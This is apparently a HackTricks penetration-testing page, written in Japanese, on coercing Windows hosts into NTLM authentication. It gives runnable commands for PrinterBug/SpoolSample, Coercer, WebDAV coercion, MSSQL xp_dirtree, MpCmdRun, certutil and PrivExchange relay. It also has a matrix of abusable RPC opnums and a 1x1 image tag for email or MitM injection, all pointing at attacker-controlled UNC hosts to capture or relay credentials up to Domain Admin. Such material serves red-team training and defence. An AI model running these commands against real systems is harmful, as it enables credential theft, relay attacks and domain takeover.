# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、3rd party dependencies を避けるために MIDL compiler を使用して C# で記述された、**remote authentication triggers** の**コレクション**です。

## Spooler Service Abuse

_**Print Spooler**_ サービスが**有効**であれば、既知の AD credentials を使って Domain Controller の print server に対し、新しい print jobs の**更新を要求**し、その通知をある system に送るように指示できます。\
printer が任意の system に通知を送信するとき、その **system に対して authentication** する必要がある点に注意してください。したがって、攻撃者は _**Print Spooler**_ サービスに任意の system へ authentication させることができ、その際サービスはこの authentication に **computer account** を使用します。

内部的には、古典的な **PrinterBug** primitive は **`\\PIPE\\spoolss`** 上の **`RpcRemoteFindFirstPrinterChangeNotificationEx`** を悪用します。攻撃者はまず printer/server handle を開き、次に `pszLocalMachine` に偽の client name を渡すことで、target spooler に **attacker-controlled host** へ戻る notification channel を作成させます。これが、効果が direct code execution ではなく **outbound authentication coercion** である理由です。\
spooler 自体で **RCE/LPE** を探している場合は、[PrintNightmare](printnightmare.md) を確認してください。このページは **coercion と relay** に焦点を当てています。

### ドメイン上の Windows Servers を見つける

PowerShell を使って、Windows boxes の一覧を取得します。Servers は通常優先度が高いので、そこに注目しましょう:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler services listening の確認

少し変更した @mysmartlogin's (Vincent Le Toux's) の [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を使用して、Spooler Service が待ち受けているか確認します:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux上でも`rpcdump.py`を使用して、**MS-RPRN**プロトコルを探すこともできます：
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Linuxから **NetExec/CrackMapExec** を使ってホストを素早くテストするには:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
スプーラーのエンドポイントが存在するかどうかを確認するだけでなく、**coercion surfaces** を列挙したい場合は、**Coercer scan mode** を使用します:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
これは有用です。というのも、EPMでエンドポイントを確認できても、そのprint RPC interfaceが登録されていることが分かるだけだからです。それは、**現在の権限であらゆる coercion method に到達できること**や、ホストが利用可能な認証フローを送出することを保証しません。

### サービスに任意のホストへの認証を要求する

[SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) をコンパイルできます。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、Linux を使っている場合は [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) または [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) を使用できます
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
**Coercer** を使うと、spooler インターフェースを直接狙え、どの RPC method が公開されているかを推測する必要を避けられます:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### WebClientでSMBの代わりにHTTPを強制する

Classic PrinterBug は通常、`\\attacker\share` への **SMB** 認証を発生させます。これは **capture**、**HTTP targets** への relay、または **SMB signing** がない場合の relay にまだ有用です。\
しかし、現代の環境では、**SMB to SMB** の relay は **SMB signing** によってしばしばブロックされるため、運用者は代わりに **HTTP/WebDAV** 認証を強制することをよく選びます。

ターゲットで **WebClient** サービスが動作している場合、listener は Windows に **HTTP 上の WebDAV** を使わせる形式で指定できます:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
これは、**`ntlmrelayx --adcs`** や他の HTTP relay target と連鎖させる場合に特に有用です。というのも、強制された接続で SMB relayability に依存しなくて済むからです。重要な注意点は、HTTP/WebDAV 版を機能させるには、被害者上で **WebClient が実行中** である必要があることです。

### Unconstrained Delegation と組み合わせる

攻撃者がすでに [Unconstrained Delegation](unconstrained-delegation.md) を持つコンピュータを侵害している場合、攻撃者は**プリンタにこのコンピュータへ認証させる**ことができます。Unconstrained Delegation により、プリンタの **computer account** の **TGT** は、Unconstrained Delegation のあるコンピュータの **memory** に**保存**されます。攻撃者はすでにこのホストを侵害しているため、この ticket を**取得**して悪用できます（[Pass the Ticket](pass-the-ticket.md)）。

## RPC 強制認証

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (外向き認証をトリガーする interfaces/opnums)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 同じ spooler pipe 上の非同期 print interface。Coercer を使って、指定したホストで到達可能な method を列挙する
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: これらの method は UNC path を運べる parameter を受け付けます（例: `\\attacker\share`）。処理されると、Windows はその UNC に対して認証（machine/user context）し、NetNTLM の capture または relay を可能にします。\
spooler abuse では、**MS-RPRN opnum 65** が依然として最も一般的で、最も文書化された primitive です。というのも、protocol specification には、server が `pszLocalMachine` で指定された client へ通知 channel を作成すると明記されているからです。

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: \\PIPE\\even 上の MS-EVEN (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: target は与えられた backup log path を開こうとし、attacker-controlled UNC に認証します。
- Practical use: Tier 0 assets (DC/RODC/Citrix/etc.) を強制して NetNTLM を送信させ、その後 AD CS endpoints (ESC8/ESC11 scenarios) や他の privileged services へ relay する。

## PrivExchange

`PrivExchange` attack は、**Exchange Server `PushSubscription` feature** に見つかった flaw の結果です。この feature により、mailbox を持つ任意の domain user は、Exchange server に対して client-provided host へ HTTP 経由で認証させることができます。

既定では、**Exchange service は SYSTEM として実行**され、過剰な privileges が付与されています（具体的には、**pre-2019 Cumulative Update の domain では WriteDacl privileges** を持ちます）。この flaw は、**LDAP への relaying** を有効にし、その後 **domain NTDS database** を抽出するために悪用できます。LDAP への relaying が不可能な場合でも、この flaw は domain 内の他の host への relay と認証に引き続き使用できます。この attack の成功により、認証済みの任意の domain user account から即座に Domain Admin へアクセスできます。

## Windows 内部

すでに Windows machine の内部にいる場合は、次の方法で privileged accounts を使って Windows に server へ接続させることができます:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
または、別のテクニックを使います: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin (Microsoft-signed binary) を使って NTLM authentication を強制することが可能です:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTMLインジェクション

### email 経由

侵害したいマシンにログインする user の **email address** がわかっているなら、たとえば次のような **1x1 image を含む email** をその user に送るだけでよいです
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
そして彼がそれを開くと、認証しようとします。

### MitM

コンピュータに対して MitM 攻撃を実行でき、彼が表示するページに HTML を注入できるなら、次のような画像をページに注入してみることができます:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM認証を強制およびフィッシングするその他の方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1をクラックする

[NTLMv1チャレンジをキャプチャできるなら、ここでそのクラック方法を読む](../ntlm/index.html#ntlmv1-attack).\
_覚えておいてください。NTLMv1をクラックするには、Responderのchallengeを "1122334455667788" に設定する必要があります_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
